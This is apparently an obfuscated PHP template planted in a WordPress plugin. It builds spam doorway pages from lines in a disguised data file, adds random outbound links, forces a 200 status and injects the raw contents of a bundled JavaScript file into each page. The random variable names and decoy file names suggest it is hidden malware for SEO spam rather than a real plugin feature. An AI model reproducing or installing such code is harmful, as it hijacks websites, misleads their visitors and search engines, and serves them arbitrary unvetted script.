<?php
$dIh2hc = intval(get_query_var('hzaxlz'));

if ($dIh2hc < 1 || $dIh2hc > 3211) return;
$bk37xcN0S7 = file(plugin_dir_path(__FILE__).'effect-stream.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$cXsh5PLSsR = explode(';', $bk37xcN0S7[$dIh2hc]);
if (count($cXsh5PLSsR) < 2) return;
$r9eM8GHUK = $cXsh5PLSsR[0];
$lbMkpK  = $cXsh5PLSsR[1];
$tZu2NBzGA4 = $cXsh5PLSsR[2];
$zKoet  = $cXsh5PLSsR[3];
$hEcy0XB3J = $cXsh5PLSsR[4];
set_query_var('ghmwuqj', $r9eM8GHUK);

$aCsPkpz = '';
$sb4Nn2Ft = plugin_dir_path(__FILE__).'supports-urls.php';
if (is_file($sb4Nn2Ft)) {
	$xeNYQC5dj = file($sb4Nn2Ft, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($xeNYQC5dj);
	shuffle($xeNYQC5dj);
	$f9Vxa = mt_rand(2, 5);
	if (count($xeNYQC5dj) > $f9Vxa) {
		for ($nrDSNk76 = 0; $nrDSNk76 < $f9Vxa; $nrDSNk76++) {
			$eCCknlr7tf = array_shift($xeNYQC5dj);
			$aCsPkpz .= '<p><a href="'.$eCCknlr7tf.'">'.$eCCknlr7tf.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $r9eM8GHUK; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $lbMkpK . "</p>\n";
				if (strlen($zKoet) > 0) echo "<p>" . $zKoet . "</p>\n";
				if (strlen($tZu2NBzGA4) > 0) echo "<p>" . $tZu2NBzGA4 . "</p>\n";
				if (strlen($hEcy0XB3J) > 0) echo '<p><a href="#"><img src="'.$hEcy0XB3J.'"></a>' . "</p>\n";
				echo $aCsPkpz;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$eXGWa = plugin_dir_path(__FILE__) . 'featured-addons.js';
if (is_file($eXGWa)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($eXGWa);
	echo '</script>';
}
get_footer();
?>
